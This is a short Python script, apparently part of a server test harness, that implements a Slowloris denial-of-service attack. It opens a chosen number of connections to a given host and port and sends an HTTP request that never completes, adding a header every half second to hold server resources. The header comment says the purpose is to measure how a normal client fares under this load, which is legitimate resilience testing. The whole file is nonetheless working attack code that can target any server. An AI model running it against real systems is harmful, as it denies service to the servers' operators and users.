#!/usr/bin/env python3
# slowloris.py host port n_clients seconds — open n_clients connections
# and dribble a request one byte at a time, holding them open for the
# duration. Purpose: hold resources hostage while the harness measures a
# normal fast client against the same server. Prints how many connections
# it managed to establish.
import socket, sys, time, threading

host, port, n, secs = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), float(sys.argv[4])
established = 0
lock = threading.Lock()
socks = []

def one():
    global established
    try:
        s = socket.create_connection((host, port), timeout=3)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        with lock:
            established += 1
            socks.append(s)
        # dribble a never-completing request header set
        s.sendall(b"GET /16k HTTP/1.1\r\n")
        end = time.time() + secs
        while time.time() < end:
            try:
                s.sendall(b"X-a: b\r\n")  # keep adding headers, never finish
            except OSError:
                return
            time.sleep(0.5)
    except OSError:
        return

threads = [threading.Thread(target=one) for _ in range(n)]
for t in threads: t.start()
time.sleep(min(secs, 2))
print("slowloris: established %d/%d connections" % (established, n))
for t in threads: t.join()
for s in socks:
    try: s.close()
    except OSError: pass
